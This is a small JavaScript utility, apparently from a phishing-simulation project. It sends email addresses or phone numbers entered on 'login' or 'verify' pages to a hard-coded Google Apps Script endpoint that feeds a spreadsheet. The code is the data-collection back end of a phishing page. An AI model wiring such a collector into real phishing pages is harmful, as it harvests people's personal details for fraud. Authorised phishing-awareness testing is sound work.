/**
 * Google Apps Script API Utility
 * Submits simulated phishing data to Google Sheets
 */

const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbw1pQTn89ctOKmP7VG4VcNIdfx2akPQiBSP2CqzC_YkDGtAgJILj8kL16_t0cL3Oniu/exec';

/**
 * Submit data to Google Sheets via Apps Script
 * @param {string} data - The data to submit (email or phone)
 * @param {string} source - The source of the data (login/verify)
 * @returns {Promise<{status: string, message?: string}>}
 */
export async function submitToSheet(data, source) {
    try {
        const formData = new URLSearchParams();
        formData.append('email', data);
        formData.append('source', source);

        const response = await fetch(APPS_SCRIPT_URL, {
            method: 'POST',
            body: formData,
            redirect: 'follow'
        });

        const result = await response.json();
        return result;
    } catch (error) {
        console.error('Error submitting to sheet:', error);
        return { status: 'error', message: error.message };
    }
}
